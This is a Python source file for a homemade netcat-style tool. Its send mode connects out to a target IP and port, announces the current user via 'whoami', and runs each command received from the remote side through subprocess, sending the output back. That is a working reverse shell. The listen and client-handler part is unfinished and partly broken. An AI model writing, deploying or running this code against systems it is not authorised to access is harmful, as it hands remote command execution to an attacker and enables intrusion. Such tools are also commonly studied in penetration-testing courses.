import argparse as ps
import shlex
import socket
import subprocess
import textwrap as tw
import subprocess as sp
import threading


class Netcat:
    def __init__(self, args, buffer=None):
        self.args = args
        self.buffer = buffer
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    def run(self):
        if self.args.listen:
            self.listen()
        else:
            self.send()

    def send(self):
        try:
            print(self.args.target, self.args.port)
            self.server.connect((self.args.target, self.args.port))
        except ConnectionRefusedError as e:
            print("Connection Error")
            return

        if self.buffer:
            self.server.send(self.buffer)

        response = ' '
        while response:
            response = self.server.recv(4896)
            response = response.decode()

            if str(response) == "quit\n" or str(response) == "exit\n":
                self.server.close()
                return

            if response:
                try:
                    result = execute(response)
                    self.server.send(result.encode())
                except Exception as e:
                    self.server.send(b'Invalid command')

                self.buffer = f"\n{sp.check_output('whoami', stderr=subprocess.STDOUT).decode('utf-8').strip()} > "
                self.server.send(self.buffer.encode())
            else:
                self.server.close()

    def listen(self):
        try:

            self.server.bind((self.args.target, self.args.port))
        except Exception as e:
            print("Error Binding To The Port")
            return

        self.server.listen(5)

        while True:
            client, add = self.server.accept()
            client_thread = threading.Thread(target=self.client_handler(), args=(client,))
            client_thread.start()

    def client_handler(self):
        pass


def main():
    parser = ps.ArgumentParser(description="Netcat tool in python",
                               formatter_class=ps.RawDescriptionHelpFormatter,
                               epilog=tw.dedent('''
        __init__.py <IP> <args>
            -l  --listen 
            -u  --udp 
            -p  --port
            -c  --command
            -e  --execute
                                     
            quit/exit to terminate session.
                                     '''))

    parser.add_argument('-c', '--command', action='store_true', default='True', help='command shell')
    parser.add_argument('-e', '--execute', help='execute specified command')
    parser.add_argument('-l', '--listen', action='store_true', help='listen for connection')
    parser.add_argument('-p', '--port', type=int, default=4040, help='Port to Listen on')
    parser.add_argument('-t', '--target', default='127.0.0.1', help='Target IP')

    args = parser.parse_args()

    if args.listen:
        buffer = ''
    else:
        buffer = (f"CONNECTED"
                  f" [ [*] ]\n {sp.check_output('whoami', stderr=subprocess.STDOUT).decode('utf-8').strip()} > ")

    nc = Netcat(args, buffer.encode())
    nc.run()


def execute(command):
    command = command.strip()
    if not command:
        print("Error.Command Not Provided.")
        return
    output = sp.check_output(shlex.split(command), stderr=subprocess.STDOUT)

    return output.decode('utf-8')


if __name__ == "__main__":
    main()
